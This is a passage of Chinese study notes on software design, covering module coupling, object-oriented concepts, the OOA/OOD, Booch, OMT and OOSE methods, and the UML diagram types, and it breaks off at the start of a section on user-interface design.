种，根据耦合度从低到高排序，如下表所示。|耦合类型|描述||----|----||非直接耦合|没有直接联系，互相不依赖对方||数据耦合|借助参数表传递简单数据||标记耦合|一个数据结构的一部分借助于接口来传递||控制耦合|模块间传递的信息中包含用于控制模块内部逻辑的信息||外部耦合|与软件以外的环境有关||公共耦合|多个模块引用同一个全局数据区||内容耦合|一个模块访问另一个模块的内部数据<br>一个模块不通过正常入口转到另一个模块的内部<br>两个模块有一部分代码重叠<br>一个模块有多个入口|&emsp;&emsp;除了满足以上两大基本原则之外，通常在模块分解时还需要注意：保持模块的大小适中，尽可能减少调用的深度，直接调用该模块的个数应该尽量大，但调用其他模块的个数则不宜过大；保证模块是单入口、单出口的；模块的作用域应该在控制域之内；功能应该是可预测的。## 8.4 面向对象的分析与设计&emsp;&emsp;面向对象方法是一种非常实用的软件开发方法，它一出现就受到软件技术人员的青睐，现已成为计算机科学研究的一个重要领域，并逐渐成为软件开发的一种主要方法。面向对象方法以客观世界中的对象为中心，其分析和设计思想符合人们的思维方式，分析和设计的结构与客观世界的实际比较接近，容易被人们接受。在面向对象方法中，分析和设计的界面并不明显，它们采用相同的符号表示，能够方便地从分析阶段平滑地过渡到设计阶段。此外，在现实生活中，用户的需求经常会发生变化，但客观世界的对象及对象间的关系比较稳定，因此用面向对象方法分析和设计的结构也相对比较稳定。### 8.4.1 面向对象的基本概念#### 1．对象和类&emsp;&emsp;对象是系统中用来描述客观事物的一个实体，它由`对象标识`（名称）、`属性`（状态、数据、成员变量）和`服务`（操作、行为、方法）三个要素组成，它们被封装为一个整体，以接口的形式对外提供服务。  &emsp;&emsp;在现实世界中，每个实体都是对象，如学生、书籍、收音机等；每个对象都有它的操作，例如书籍的页数，收音机的频道、按钮等属性，以及收音机的切换频道等操作。  &emsp;&emsp;而类则是对具有相同属性和服务的一个或一组对象的抽象。类与对象是抽象描述和具体实例的关系，一个具体的对象被称为类的一个实例。在系统设计过程中，类可以分为三种类型，分别是实体类、边界类和控制类。1. 实体类  &emsp;&emsp;实体类映射需求中的每个实体，实体类保存需要存储在永久存储体中的信息，例如，在线教育平台系统可以提取出学员类和课程类，它们都属于实体类。实体类通常都是永久性的，它们所具有的属性和关系是长期需要的，有时甚至在系统的整个生存期都需要。  &emsp;&emsp;实体类是对用户来说最有意义的类，通常采用业务领域术语命名，一般来说是一个名词，在用例模型向领域模型的转化中，一个参与者一般对应于实体类。通常可以从 SRS 中的那些与数据库表（需要持久存储）对应的名词着手来找寻实体类。通常情况下，实体类一定有属性，但不一定有操作。2. 控制类  &emsp;&emsp;控制类是用于控制用例工作的类，一般是由动宾结构的短语（“动词+名词”或“名词+动词”）转化来的名词，例如，用例“身份验证”可以对应于一个控制类“身份验证器”，它提供了与身份验证相关的所有操作。控制类用于对一个或几个用例所特有的控制行为进行建模，控制对象（控制类的实例）通常控制其他对象，因此，它们的行为具有协调性。  &emsp;&emsp;控制类将用例的特有行为进行封装，控制对象的行为与特定用例的实现密切相关，当系统执行用例的时候，就产生了一个控制对象，控制对象经常在其对应的用例执行完毕后消亡。  &emsp;&emsp;通常情况下，控制类没有属性，但一定有方法。3. 边界类  &emsp;&emsp;边界类用于封装在用例内、外流动的信息或数据流。边界类位于系统与外界的交接处，包括所有窗体、报表、打印机和扫描仪等硬件的接口，以及与其他系统的接口。要寻找和定义边界类，可以检查用例模型，每个参与者和用例交互至少要有一个边界类，`边界类使参与者能与系统交互`。边界类是一种用于对系统外部环境与其内部运作之间的交互进行建模的类。常见的边界类有窗口、通信协议、打印机接口、传感器和终端等。实际上，在系统设计时，产生的报表都可以作为边界类来处理。  &emsp;&emsp;边界类用于系统接口与系统外部进行交互，边界对象将系统与其外部环境的变更（例如，与其他系统的接口的变更、用户需求的变更等）分隔开，使这些变更不会对系统的其他部分造成影响。通常情况下，边界类可以既有属性也有方法。#### 2．继承与泛化&emsp;&emsp;继承是面向对象方法中重要的概念，用来说明特殊类（子类）与一般类（父类）的关系，而通常用泛化来说明一般类与特殊类的关系，也就是说它们是一对多关系。  &emsp;&emsp;如下图所示，“交通工具”是“自行车”和“小轿车”的泛化；“自行车”和“小轿车”从“交通工具”中继承。![继承与泛化示意图](https://pic.lufer.cc/images/2021/03/15/yCquzq.png)#### 3．多态与重载&emsp;&emsp;多态（即多种形式）性是指一般类中定义的属性或服务被特殊类继承后，可以具有不同的数据类型或表现出不同的行为，通常是使用重载和改写两项技术来实现的。一般有 4 种不同形式的多态，如下表所示。|多态类型|描述||----|----||重载（专用多态）|描述一个函数名称有多种不同的实现方式，通常可以在编译时基于类型签名来区分各个重载函数的名称||改写（包含多态）|是重载的一种特殊情况，只发生在有关父类和子类之间关系中。通常签名相同，内容不一样||多态变量（赋值多态强制多态）|声明为一种类型，但实际上却可以包含另一种类型数值的变量||泛型（模板、参数多态）|它提供了一种创建通用工具的方法，可以在特定场合将其特化|&emsp;&emsp;注 1：重载也称为过载、重置；    &emsp;&emsp;注 2：参数多态和包含多态称为通用多态，重载多态和强制多态称为特定多态。>虽然重载和改写都是在多种潜在的函数体中，选择和调用某一个函数或方法并对其进行执行，但它们的本质区别在于：重载是编译时执行的（静态绑定），而改写则是运行时选择的（动态绑定）。#### 4．模板类&emsp;&emsp;也称为类属类，它用来实现参数多态机制。一个类属类是关于一组类的一个特性抽象，它强调的是这些类的成员特征中与具体类型无关的那些部分，而用变元来表示与具体类型有关的那些部分。#### 5．消息和消息通信&emsp;&emsp;消息就是向对象发出的服务请求，它通常包括提供服务的对象标识、消息名、输入信息和回答信息。消息通信则是面向对象方法学中的一个重要原则，它与对象的封装原则密不可分，为对象间提供了唯一合法的动态联系的途径。### 8.4.2 面向对象分析&emsp;&emsp;面向对象分析的目标是开发一系列模型，这些模型描述计算机软件，当它工作时以满足一组客户定义的需求。对象技术的流行，演化出了数十种不同的 OOA 方法，每个方法都引入了一个产品或系统分析的过程、一组过程演化的模型及使软件工程师能够以一致的方式创建每个模型的符号体系。其中比较流行的方法包括 OMT、OOA、OOSE、Booch 方法等，而OMT、OOSE、Booch 最后则统一成为 UML。#### 1．OOA/OOD 方法&emsp;&emsp;这是由 Peter Coad 和 Edward Yourdon 提出的，OOA 模型中包括主题、对象类、结构、属性和服务 5 个层次，需经过标识对象类、标识结构与关联（包括继承、聚合、组合、实例化等）、划分主题、定义属性、定义服务 5 个步骤来完成整个分析工作。  &emsp;&emsp;OOD 中将继续贯穿 OOA 中的 5 个层次和 5 个活动，它由人机交互部件、问题域部件、任务管理部件、数据管理部件 4 个部分组成，其主要的活动就是这 4 个部件的设计工作。  1. 设计问题域部分  &emsp;&emsp;OOA 的结果恰好是 OOD 的问题域部件，分析的结果在 OOD 中可以被改动或增补，但基于问题域的总体组织框架是长时间稳定的。2. 设计人机交互部件  &emsp;&emsp;人机交互部件在上述结果中加入人机交互的设计和交互的细节，包括窗口和输出报告的设计。可以用原型来帮助实际交互机制进行开发和选择。3. 设计任务管理部分  &emsp;&emsp;这部分主要是识别事件驱动任务，识别时钟驱动任务，识别优先任务和关键任务，识别协调者，审查每个任务并定义每个任务。4. 设计数据管理部分  &emsp;&emsp;数据管理部分提供了在数据管理系统中存储和检索对象的基本结构，其目的是隔离数据管理方法对其他部分的影响。#### 2．Booch 方法&emsp;&emsp;Booch 认为软件开发是一个螺旋上升的过程，每个周期中包括标识类和对象、确定类和对象的含义、标识关系、说明每个类的接口和实现 4 个步骤。它的模型中主要包括如下表所示的几种图形。||静态模型|动态模型||----|----|----||逻辑模型|类图<br>对象图|状态转换图<br>时序图||物理模型|模块图<br>进程图||&emsp;&emsp;Booch 方法的开发过程是一个迭代的、渐进式的系统开发过程，它可以分为宏过程和微过程两类。宏过程用于控制微过程，是覆盖几个月或几周所进行的活动，它包括负责建立核心需求的概念化，为所期望的行为建立模型的分析，建立架构的设计，形成实现的进化，以及管理软件交付使用的维护等 5 个主要活动。  &emsp;&emsp;而微过程则基本上代表了开发人员的日常活动，它由 4 个重要、没有顺序关系的步骤组成：在给定的抽象层次上识别出类和对象，识别出这些类和对象的语义，识别出类间和对象间的关系，实现类和对象。#### 3．OMT 方法&emsp;&emsp;OMT 是对象建模技术的缩写，它是由 Jam Rambaugh 及其同事合作开发的，它主要用于分析、系统设计和对象设计。包括对象模型（静态的、结构化的系统的“数据”性质，通常采用类图）、动态模型（瞬时的、行为化的系统“控制”性质，通常使用状态图）和功能模型（表示变化的系统的“功能”性质，通常使用数据流图）。OMT 方法的三大模型如下表所示。|模型|说明|主要技术||----|----|----||对象模型|描述系统中对象的静态结构，对象之间的关系、属性、操作。它表示静态的、结构上的、系统的“数据”特征|对象图||动态模型|描述与时间和操作顺序有关的系统特征，如激发事件、事件序列、确定事件先后关系的状态。它表示瞬时、行为上的、系统的“控制”特征|状态图||功能模型|描述与值的变换有关的系统特征：功能、映射、约束和函数依赖|数据流图|#### 4.OOSE 方法&emsp;&emsp;OOSE 是面向对象软件工程的缩写，它是由 Ivar Jacobson 提出的。它在 OMT 的基础上，对功能模型进行了补充，提出了“用例”的概念，最终取代数据流图进行需求分析和建立功能模型。### 8.4.3 统一建模语言&emsp;&emsp;统一建模语言（Unified Modeling Language，UML）是用于系统的可视化建模语言，它将OMT、OOSE 和 Booch 方法中的建模语言和方法有机地融合在一起，是国际统一的软件建模标准。虽然它源于 OO 软件系统建模领域，但由于其内建了大量扩展机制，也可以应用于更多的领域中，例如工作流程、业务领域等。#### 1．UML 是什么&emsp;&emsp;UML是一种语言：UML 在软件领域中的地位与价值就像“1、2、3、+、 、…”等符号在数学领域中的地位一样。它为软件开发人员之间提供了一种用于交流的词汇表和一种用于软件蓝图的标准语言。  &emsp;&emsp;UML是一种可视化语言：UML 只是一组图形符号，它的每个符号都有明确语义，是一种直观、可视化的语言。  &emsp;&emsp;UML是一种可用于详细描述的语言：UML 所建的模型是精确的、无歧义和完整的，因此适合于对所有重要的分析、设计和实现决策进行详细描述。  &emsp;&emsp;UML是一种构造语言：UML 虽然不是一种可视化的编程语言，但其与各种编程语言直接相连，而且有较好的映射关系，这种映射允许进行正向工程、逆向工程。  &emsp;&emsp;UML是一种文档化语言：它适合于建立系统架构及其所有的细节文档。#### 2．UML 的结构&emsp;&emsp;UML由`构造块`、`公共机制`和`架构`三个部分组成。1. 构造块  &emsp;&emsp;构造块也就是基本的 UML 建模元素（事物）、关系和图。  &emsp;&emsp;建模元素：包括结构事物（类、接口、协作、用例、活动类、组件、节点等）、行为事物（交互、状态机）、分组事物（包）、注释事物。  &emsp;&emsp;关系：包括关联关系、依赖关系、泛化关系、实现关系。  &emsp;&emsp;图：UML 2.0 包括 14 种不同的图，分为表示系统静态结构的静态模型（包括类图、对象图、包图、构件图、部署图、制品图），以及表示系统动态结构的动态模型（包括对象图、用例图、顺序图、通信图、定时图、状态图、活动图、交互概览图）。2. 公共机制  &emsp;&emsp;公共机制是指达到特定目标的公共 UML 方法，主要包括规格说明、修饰、公共分类和扩展机制 4 种。  &emsp;&emsp;规格说明：规格说明是元素语义的文本描述，它是模型的重要组成部分。  &emsp;&emsp;修饰：UML 为每一个模型元素设置了一个简单的记号，还可以通过修饰来表达更多的信息。  &emsp;&emsp;公共分类：包括类元与实体（类元表示概念，而实体表示具体的实体）、接口和实现（接口用来定义契约，而实现就是具体的内容）两组公共分类。  &emsp;&emsp;扩展机制：包括约束（添加新规则来扩展元素的语义）、构造型（用于定义新的 UML建模元素）、标记值（添加新的特殊信息来扩展模型元素的规格说明）。3. 架构  &emsp;&emsp;UML 对系统架构的定义是：系统的组织结构，包括系统分解的组成部分、它们的关联性、交互、机制和指导原则，这些提供系统设计的信息。而具体来说，就是指 5个系统视图。  &emsp;&emsp;逻辑视图：以问题域的语汇组成的类和对象集合。  &emsp;&emsp;进程视图：可执行线程和进程作为活动类的建模，它是逻辑视图的一次执行实例。  &emsp;&emsp;实现视图：对组成基于系统的物理代码的文件和组件进行建模。  &emsp;&emsp;部署视图：把组件物理地部署到一组物理的、可计算的节点上。  &emsp;&emsp;用例视图：最基本的需求分析模型。#### 3．用例图基础&emsp;&emsp;用例是什么呢？Ivar Jacobson 是这样描述的：“用例实例是在系统中执行的一系列动作，这些动作将生成特定参与者可见的价值结果。一个用例定义一组用例实例。”首先，从定义中得知用例是由一组用例实例组成的，用例实例也就是常说的“使用场景”，就是用户使用系统的一个实际的、特定的场景。其次，可以知道，用例应该给参与者带来可见的价值，这点很关键。最后，用例是在系统中的。  &emsp;&emsp;而用例模型描述的是外部参与者所理解的系统功能。用例模型用于需求分析阶段，它的建立是系统开发者和用户反复讨论的结果，表明了开发者和用户对需求规格达成的共识。下图是一个用例图的例子。![用例图示例](https://pic.lufer.cc/images/2021/03/15/yCvNMn.png)1. 参与者  &emsp;&emsp;参与者代表与系统接口的任何事物或人，它是指代表某一种特定功能的角色，因此，参与者都是虚拟的概念。在 UML 中，用一个小人表示参与者。  &emsp;&emsp;用例图示例中的“图书管理员”就是参与者。对于该系统来说，可能可以充当图书管理员角色的有多个人，由于他们对系统均起着相同的作用，扮演相同的角色，因此只用一个参与者来表示。切忌不要为每一个可能与系统交互的真人画出一个参与者。2. 用例  &emsp;&emsp;用例是对系统行为的动态描述，它可以促进设计人员、开发人员与用户的沟通，理解正确的需求，还可以划分系统与外部实体的界限，是系统设计的起点。在识别出参与者之后，可以使用下列问题帮助识别用例。  &emsp;&emsp;每个参与者的任务是什么？  &emsp;&emsp;有参与者将要创建、存储、修改、删除或读取系统中的信息吗？  &emsp;&emsp;什么用例会创建、存储、修改、删除或读取这个信息？  &emsp;&emsp;参与者需要通知系统外部的突然变化吗？  &emsp;&emsp;需要通知参与者系统中正在发生的事情吗？  &emsp;&emsp;什么用例将支持和维护系统？  &emsp;&emsp;所有的功能需求都对应到用例中了吗？   &emsp;&emsp;系统需要何种输入/输出？输入从何处来？输出到何处？  &emsp;&emsp;当前运行系统的主要问题是什么？3. 包含和扩展  &emsp;&emsp;两个用例之间的关系可以主要概括为两种情况。一种是用于重用的包含关系，用构造型`<<include>>`或者`<<use>>`表示；另一种是用于分离出不同的行为，用构造型`<<extend>>`表示。  &emsp;&emsp;包含关系：当可以从两个或两个以上的原始用例中提取公共行为，或者发现能够使用一个组件来实现某一个用例的部分功能是很重要的事时，应该使用包含关系来表示。所提取出来的公共行为称为抽象用例。包含关系的例子如下图所示。  ![包含关系示例](https://pic.lufer.cc/images/2021/03/15/yCzDgJ.png)  &emsp;&emsp;扩展关系：如果一个用例明显地混合了两种或两种以上的不同场景，即根据情况可能发生多种事情。可以将这个用例分为一个主用例和一个或多个辅用例，描述可能更加清晰。扩展关系的例子如下图所示。  ![拓展关系示例](https://pic.lufer.cc/images/2021/03/15/yCzyuR.png)  #### 4．类图和对象图基础&emsp;&emsp;在面向对象建模技术中，将客观世界的实体映射为对象，并归纳成一个个类。类、对象和它们之间的关联是面向对象技术中最基本的元素。对于一个想要描述的系统，其类模型和对象模型揭示了系统的结构。在 UML 中，类和对象模型分别由类图和对象图表示。类图技术是 OO 方法的核心。下图是一个类图的实例。![类图示例](https://pic.lufer.cc/images/2021/03/15/yCzTKA.png)1. 类和对象  &emsp;&emsp;对象与人们对客观世界的理解相关。人们通常用对象描述客观世界中某个具体的实体。所谓类是对一类具有相同特征的对象的描述。而对象是类的实例。在 UML中，类的可视化表示为一个划分成三个格子的长方形（下面两个格子可省略）。在类图示例图中，“书籍”、“借阅记录”等都是一个类。  &emsp;&emsp;类的获取和命名：最顶部的格子包含类的名字。类的命名应尽量用应用领域中的术语，应明确、无歧义，以利于开发人员与用户之间的相互理解和交流。  &emsp;&emsp;类的属性：中间的格子包含类的属性，用以描述该类对象的共同特点。该项可省略。类图示例图中“书籍”类有“书名”、“书号”等属性。UML 规定类的属性的语法为： “可见性 属性名：类型 = 默认值 {约束特性}”。  &emsp;&emsp;可见性包括 Public、Private 和 Protected，分别用+、-、#号表示。   &emsp;&emsp;类型表示该属性的种类：它可以是基本数据类型，例如整数、实数、布尔型等，也可以是用户自定义的类型。一般它由所涉及的程序设计语言确定。约束特性则是用户对该属性性质的一个约束说明。例如“{只读}”说明该属性是只读属性。  &emsp;&emsp;类的操作（Operation）：该项可省略。操作用于修改、检索类的属性或执行某些动作。操作通常也被称为功能，但是它们被约束在类的内部，只能作用到该类的对象上。操作名、返回类型和参数表组成操作界面。UML 规定操作的语法为：“可见性：操作名（参数表）：返回类型 {约束特性}”。  &emsp;&emsp;类图描述了类和类之间的静态关系。定义了类之后，就可以定义类之间的各种关系了。2. 类之间的关系  &emsp;&emsp;在建立抽象模型时，会发现很少有类会单独存在，大多数都将会以某种方式互相协作，因此还需要描述这些类之间的关系。关系是事物间的连接，在面向对象建模中，有 4 个很重要的关系。    * 依赖关系      &emsp;&emsp;有两个元素 X、Y，如果修改元素 X 的定义可能会引起对另一个元素 Y 的定义的修改，则称元素 Y 依赖于元素 X。在 UML 中，使用带箭头的虚线表示依赖关系。      &emsp;&emsp;在类中，依赖由多种原因引起，如：一个类向另一个类发消息；一个类是另一个类的数据成员；一个类是另一个类的某个操作参数。如果一个类的界面改变，它发出的任何消息可能不再合法。    * 泛化关系      &emsp;&emsp;泛化关系描述了一般事物与该事物中的特殊种类之间的关系，也就是父类与子类之间的关系。继承关系是泛化关系的反关系，也就是说子类是从父类中继承的，而父类则是子类的泛化。在 UML 中，使用带空心箭头的实线表示，箭头指向父类。      &emsp;&emsp;在 UML 中，对泛化关系有 3 个要求：      &emsp;&emsp;子类应与父类完全一致，父类所具有的关联、属性和操作，子类都应具有���      &emsp;&emsp;子类中除了与父类一致的信息外，还包括额外的信息。      &emsp;&emsp;可以使用子父类实例的地方，也可以使用子类实例。      * 关联关系      &emsp;&emsp;关联表示两个类之间存在某种语义上的联系。例如，一个人为一家公司工作，一家公司有许多办公室。就认为人和公司、公司和办公室之间存在某种语义上的联系。      &emsp;&emsp;关联关系提供了通信的路径，它是所有关系中最通用的、语义最弱的。在 UML 中，用一条实线来表示关联关系。    * 聚合关系      &emsp;&emsp;聚合是一种特殊形式的关联。聚合表示类之间的关系是整体与部分的关系。例如一辆轿车包含四个车轮、一个方向盘、一个发动机和一个底盘，就是聚合的一个例子。在 UML中，用一个带空心菱形的实线表示，空心菱形指向的是代表“整体”的类。`部分与整体的生命周期可以不相同`    * 组合关系      &emsp;&emsp;如果聚合关系中的表示“部分”的类的存在，与表示“整体”的类有着紧密的关系，例如“公司”与“部门”之间的关系，那么就应该使用“组合”关系来表示。在 UML 中，用带有实心菱形的实线表示，菱形指向的是代表“整体”的类。`部分与整体的生命周期是相同的`    * 实现关系      &emsp;&emsp;实现关系是用来规定接口和实现接口的类或组件之间的关系的。接口是操作的集合，这些操作用于规定类或组件的服务。在 UML 中，用一个带空心箭头的虚线表示。3. 多重性问题  &emsp;&emsp;重复度又称多重性，多重性表示为一个整数范围 n…m，整数 n 定义所连接的最少对象的数目，而 m 则为最多对象数（当不知道确切的最大数时，最大数用\*号表示）。最常见的多重性有：0…1；0…\*；1…1；1…\*；\*。多重性是用来说明关联的两个类之间的数量关系的，例如：  &emsp;&emsp;书与借书记录之间的关系，就应该是 1 对 0…1 的关系，也就是一本书可以有 0 个或 1 个借书记录。  &emsp;&emsp;经理与员工之间的关系，则应为 1 对 0…*的关系，也就是一个经理可以领导 0 个或多个员工。  &emsp;&emsp;学生与选修课程之间的关系，就可以表示为 0…\*对 1…\*的关系，也就是一个学生可以选择1 门或多门课程，而一门课程可以有 0 个或多个学生选修。4. 类图  &emsp;&emsp;对于软件系统，其类模型和对象模型类图描述类和类之间的静态关系。与数据模型不同，它不仅显示了信息的结构，同时还描述了系统的行为。类图是定义其他图的基础。5. 对象图  &emsp;&emsp;UML 中对象图与类图具有相同的表示形式。对象图可以看作是类图的一个实例。对象是类的实例；对象之间的链（Link）是类之间的关联的实例。对象与类的图形表示相似，均为划分成两个格子的长方形（下面的格子可省略）。上面的格子是对象名，对象名下有下画线；下面的格子记录属性值。链的图形表示与关联相似。对象图常用于表示复杂类图的一个实例。#### 5．交互图基础&emsp;&emsp;交互图是表示各组对象如何依某种行为进行协作的模型。通常可以使用一个交互图来表示和说明一个用例的行为。在 UML 中，包括 3 种不同形式的交互图，强调对象交互行为顺序的顺序图，强调对象协作的通信图（UML1.X 版本中称为“协作图”），强调消息的具体时间的定时图，它们之间没有什么本质不同，只是排版不尽相同而已。1. 顺序图  &emsp;&emsp;顺序图用来描述对象之间动态的交互关系，着重体现对象间消息传递的时间顺序。顺序图允许直观地表示出对象的生存期，在生存期内，对象可以对输入消息做出响应，并且可以发送信息。下图是一个顺序图的示例。    ![顺序图示例](https://pic.lufer.cc/images/2021/03/15/yPgGbq.png)     &emsp;&emsp;如上图所示，顺序图存在两个轴，水平轴表示不同的对象，即图中的 Client、Factory、Product 等；而垂直轴表示时间，表示对象及类的生命周期。  &emsp;&emsp;对象间的通信通过在对象的生命线间画消息来表示。消息的箭头指明消息的类型。顺序图中的消息可以是信号、操作调用或类似于 C++中的 RPC（Remote Procedure Calls）和 Java中的 RMI（Remote Method Invocation）。当收到消息时，接收对象立即开始执行活动，即对象被激活了。通过在对象生命线上显示一个细长矩形框来表示激活。  &emsp;&emsp;消息可以用消息名及参数来标识，消息也可带有顺序号。消息还可带有条件表达式，表示分支或决定是否发送消息。如果用于表示分支，则每个分支是相互排斥的，即在某一时刻仅可发送分支中的一个消息。2. 通信图  &emsp;&emsp;通信图用于描述相互合作的对象间的交互关系和链接关系。虽然顺序图和通信图都用来描述对象间的交互关系，但侧重点不一样。顺序图着重体现交互的时间顺序，通信图则着重体现交互对象间的静态链接关系。下图就是与顺序图示例相对应的通信图，可以从下图中很明显地发现它与顺序图之间的异同点。   ![通信图示例](https://pic.lufer.cc/images/2021/03/15/yPfylD.png)  3. 定时图  &emsp;&emsp;如果要表示的交互具有很强的时间特性（例如，现实生活中的电子工程、实时控制等系统中），在 UML 1.X 中是无法有效地表示出来的。而在 UML 2.0 中引入了一种新的交互图来解决这类问题，这就是着重表示定时约束的定时图。  &emsp;&emsp;根据 UML 的定义，定时图实际上是一种特殊形式的顺序图（即一种变化），它与顺序图的区别主要体现在以下几个方面。  &emsp;&emsp;坐标轴交换了位置，改为从左到右来表示时间的推移。  &emsp;&emsp;用生命线的“凹下凸起”来表示状态的变化，每个水平位置代表一种不同的状态，状态的顺序可以有意义、也可以没有意义。  &emsp;&emsp;生命线可以跟在一根线后面，在这根线上显示一些不同的状态值。  &emsp;&emsp;可以显示一个度量时间值的标尺，用刻度来表示时间间隔。  &emsp;&emsp;下图是一个定时图的实际例子，其中小黑点加曲线表示的是注释。它用来表示一个电子门禁系统的控制逻辑，该门禁系统包括门（物理的门）、智能读卡器（读取用户的智能卡信息）、处理器（用来处理是否开门的判断）。   ![定时图实例](https://pic.lufer.cc/images/2021/03/15/yPhZh6.png)    &emsp;&emsp;在这个例子中，它所表示的意思是一开始读卡器是启用的（等用户来刷卡）、处理器是空闲的（没有验证的请求）、门是关的；接着，当用户刷卡时，读卡器就进入了“等待校验”的状态，并发一个消息给处理器，处理器就进入了校验状态。如果校验通过，就发送一个“禁用”消息给读卡器（因为门开的时候，读卡器就可以不工作），使读卡器进入禁用状态；并且自己转入启用状态，这时门的状态变成了“开”。而门“开”了 30 秒钟（根据时间刻度得知）之后，处理器将会把它再次“关”上，并且发送一个“启用”消息给读卡器（门关了，读卡器开始重新工作），这时读卡器再次进入启用状态，而处理器已经又回到了空闲状态。  &emsp;&emsp;从上面的例子中，不难看出定时图所包含的图元并不多，主要包括生命线、状态、状态变迁、消息、时间刻度，可以根据自身的需要来使用它。#### 6．状态图基础状态图&emsp;&emsp;用来描述一个特定对象的所有可能状态及其引起状态转移的事件。大多数面向对象技术都用状态图表示单个对象在其生命周期中的行为。一个状态图包括一系列的状态及状态之间的转移。下图是一个数码冲印店的订单状态图实例。  ![状态图示例](https://pic.lufer.cc/images/2021/03/15/yP54t1.png) &emsp;&emsp;状态图包括以下���分。  &emsp;&emsp;状态：又称为中间状态，用圆角矩形框表示；  &emsp;&emsp;初始状态：又称为初态，用一个黑色的实心圆圈表示，在一张状态图中只能够有一个初始状态；  &emsp;&emsp;结束状态：又称为终态，在黑色的实心圆圈外面套上一个空心圆，在一张状态图中可能有多个结束状态；  &emsp;&emsp;状态转移：用箭头说明状态的转移情况，并用文字说���引发这个状态变化的相应事件是什么。  &emsp;&emsp;一个状态也可能被细分为多个子状态，那么如果将这些子状态都描绘出来的话，那这个状态就是复合状态。  &emsp;&emsp;状态图适合用于表述在不同用例之间的对象行为，但并不适合用于表述包括若干用例协作的对象行为。通常不会需要对系统中的每一个类绘制相应的状态图，而通常会在业务流程、控制对象、用户界面的设计方面使用状态图。  #### 7．活动图基础&emsp;&emsp;活动图的应用非常广泛，它既可用来描述操作（类的方法）的行为，也可以描述用例和对象内部的工作过程。活动图是由状态图变化而来的，它们各自用于不同的目的。活动图依据对象状态的变化来捕获动作（将要执行的工作或活动）与动作的结果。活动图中一个活动结束后将立即进入下一个活动（在状态图中状态的变迁可能需要事件的触发）。1. 基本活动图  &emsp;&emsp;下图是一个基本活动图的例子。   ![活动图示例](https://pic.lufer.cc/images/2021/03/15/yP5HXD.png) &emsp;&emsp;如图所示，活动图与状态图类似，包括了初始状态、终止状态，以及中间的活动状态，每个活动之间，也就是一种状态的变迁。在活动图中，还引入了以下几个概念。  &emsp;&emsp;判定：说明基于某些表达式的选择性路径，在 UML 中使用菱形表示。  &emsp;&emsp;分支与组合：由于活动图建模时，经常会遇到并发流，因此在 UML 中引入了如上图所示的粗线来表示分支和组合。2. 带泳道的活动图  &emsp;&emsp;在前面说明的基本活动图中，虽然能够描述系统发生了什么，但没有说明该项活动由谁来完成。而针对 OOP 而言，这就意味着活动图没有描述出各个活动由哪个类来完成。要想解决这个问题，可以通过泳道来解决这一问题。它将活动图的逻辑描述与顺序图、协作图的责任描述结合起来。下图是一个使用了泳道的例子。  ![带泳道的活动图示例](https://pic.lufer.cc/images/2021/03/15/yP5xht.png)  3. 对象流  &emsp;&emsp;在活动图中可以出现对象。对象可以作为活动的输入或输出，对象与活动间的输入/输出关系由虚线箭头来表示。如果仅表示对象受到某一活动的影响，则可用不带箭头的虚线来连接对象与活动。4. 信号  &emsp;&emsp;在活动图中可以表示信号的发送与接收，分别用发送和接收标识来表示。  &emsp;&emsp;发送和接收标识也可与对象相连，用于表示消息的发送者和接收者。#### 8．构件图基础&emsp;&emsp;构件图是面向对象系统的物理方面进行建模要用的两种图之一。它可以有效地显示一组构件，以及它们之间的关系。构件图中通常包括构件、接口及各种关系。下图是一个构件图的例子。   ![构件图示例](https://pic.lufer.cc/images/2021/03/15/yPIwuD.png)    &emsp;&emsp;通常构件指的是源代码文件、二进制代码文件和可执行文件等。而构件图就是用来显示编译、链接或执行时构件之间的依赖关系的。例如，在上图中，就是说明 QueryClient.exe将通过调用 QueryServer.exe 来完成相应的功能，而 QueryServer.exe 则需要 Find.exe 的支持， Find.exe 在实现时调用了 Query.dll。  &emsp;&emsp;通常来说，可以使用构件图完成以下工作。  &emsp;&emsp;对源代码进行建模：这样可以清晰地表示出各个不同源程序文件之间的关系。  &emsp;&emsp;对可执行体的发布建模：如图所示，将清晰地表示出各个可执行文件、DLL 文件之间的关系。  &emsp;&emsp;对物理数据库建模：用来表示各种类型的数据库、表之间的关系。  &emsp;&emsp;对可调整的系统建模：例如对应用了负载均衡、故障恢复等系统的建模。  &emsp;&emsp;在绘制构件图时，应该注意侧重于描述系统的静态实现视图的一个方面，图形不要过于简化，应该为构件图取一个直观的名称，在绘制时避免产生线的交叉。#### 9．部署图基础&emsp;&emsp;部署图，也称为实施图，它和构件图一样，是面向对象系统的物理方面建模的两种图之一。构件图是说明构件之间的逻辑关系，而部署图则是在此基础上更进一步地描述系统硬件的物理拓扑结构及在此结构上执行的软件。部署图可以显示计算结点的拓扑结构和通信路径、结点上运行的软件构件，常用于帮助理解分布式系统。  &emsp;&emsp;下图就是与构件图示例对应的部署图，这样的图示可以使系统的安装、部署更为简单。 ![部署图示例](https://pic.lufer.cc/images/2021/03/15/yPTy1P.png)&emsp;&emsp;在部署图中，通常包括以下一些关键的组成部分。1. 节点和连接  &emsp;&emsp;节点代表一个物理设备及其上运行的软件系统，如一台 UNIX 主机、一个 PC 终端、一台打印机、一个传感器等。  &emsp;&emsp;如上图所示，“客户端：个人 PC”和“服务器”就是两个节点。在 UML 中，使用一个立方体表示一个节点，节点名放在左上角。节点之间的连线表示系统之间进行交互的通信路径，在 UML 中被称为连接。通信类型则放在连接旁边的“《》”之间，表示所用的通信协议或网络类型。2. 构件和接口  &emsp;&emsp;在部署图中，构件代表可执行的物理代码模块，如一个可执行程序。  &emsp;&emsp;逻辑上它可以与类图中的包或类对应。例如，在部署图示例中，“服务器”结点中包含“QueryServer.exe”、“Find.exe”和“Query.dll”3 个构件。  &emsp;&emsp;在面向对象方法中，类和构件等元素并不是所有的属性和操作都对外可见。它们对外提供了可见操作和属性，称之为类和构件的接口。界面可以表示为一头是小圆圈的直线。在部署图示例中，“Query.dll”构件提供了一个“查询”接口。## 8.5 用户界面设计&emsp;&emsp;接口设计主要包括三个方面的内容：一是设计软件构件间的接口；二是设计模块和其他非人的信息生产者和消费者（如外部实体）的接口；三是人（如用户）和计算机间界面设计。  &emsp;&emsp;软件构件间接口的设计与架构的设计紧密相关���而设计模块和外部实体的接口则与详细设计相关，人机界面接口是相当容易被忽视的环节，在此就对其重点内容进行一个概要性描述。### 8.5.1 用户界面设计的原则&emsp;&emsp;用户界面设计必须考虑软件使用者的体力和脑力，根据 Theo Mandel 的总结，设计时必须遵从三个黄金法则。  